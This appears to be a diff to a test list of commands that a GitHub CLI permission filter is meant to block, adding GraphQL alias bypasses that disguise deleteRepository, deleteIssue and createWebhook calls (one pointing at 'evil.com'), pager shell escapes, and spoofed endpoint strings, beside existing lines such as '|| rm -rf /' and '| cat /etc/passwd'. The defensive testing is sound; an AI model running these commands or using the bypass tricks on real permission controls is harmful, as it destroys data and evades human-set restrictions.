@@ -229,6 +229,13 @@ gh api graphql -f query='mutation { createIssue(input: {addPullRequestReview: "t
 gh api graphql -f query='mutation Bypass { deletePullRequest(input: {addPullRequestReviewComment: "x"}) { pr { id } } }'
 gh api graphql -f query='mutation($id: ID!) { deleteRef(input: {resolveReviewThread: $id}) { clientMutationId } }'
 
+# Bypass attempts using allowed mutation names as ALIASES for dangerous mutations
+# In GraphQL, "aliasName: actualOperation(...)" uses aliasName as an alias for actualOperation
+gh api graphql -f query='mutation { resolveReviewThread: deleteIssue(input: {issueId: "123"}) { id } }'
+gh api graphql -f query='mutation { addPullRequestReview: deleteRepository(input: {repositoryId: "123"}) { clientMutationId } }'
+gh api graphql -f query='mutation { unresolveReviewThread: deleteLabel(input: {id: "123"}) { clientMutationId } }'
+gh api graphql -f query='mutation Bypass { addPullRequestReviewComment: createWebhook(input: {url: "evil.com"}) { webhook { id } } }'
+
 # =============================================================================
 # SHELL INJECTION ATTEMPTS
 # =============================================================================
@@ -252,7 +259,12 @@ gh pr view 123|| rm -rf /
 gh pr view 123 ||rm -rf /
 gh api /repos/owner/repo || curl evil.com
 
-# Pipe to malicious commands (not jq/head/tail)
+# Pipe to malicious commands (not in safe list)
+# Note: less/more support shell escapes (e.g., !cmd), so they're blocked
+gh pr view 123 | less
+gh pr view 123 | more
+gh api /repos/owner/repo | less
+gh api /repos/owner/repo | more
 gh pr view 123 | cat /etc/passwd
 gh pr view 123 | sh
 gh pr view 123 | bash
@@ -618,6 +630,12 @@ gh api repos/owner/repo/pulls/123/comments -f body='test'
 gh api repos/owner/repo/issues/comments -f body='test'
 gh api /repos/owner/repo/comments -f body='test'
 gh api repos/owner/repo/pulls/comments -f body='test'
+
+# Bypass attempts: including allowed endpoint patterns in field values while posting to different endpoints
+gh api repos/owner/repo/dangerous-endpoint -f body='text /pulls/1/comments/1/replies'
+gh api repos/owner/repo/hooks -f body='/issues/123/comments should not bypass'
+gh api /repos/owner/repo/deployments -f ref='/pulls/999/comments/888/replies'
+gh api repos/owner/repo/pulls -f title='/issues/1/comments bypass attempt'
 
 # GraphQL trying to look like query but with mutation
 gh api graphql -f query='query { mutation { deleteIssue(input: {}) { id } } }'
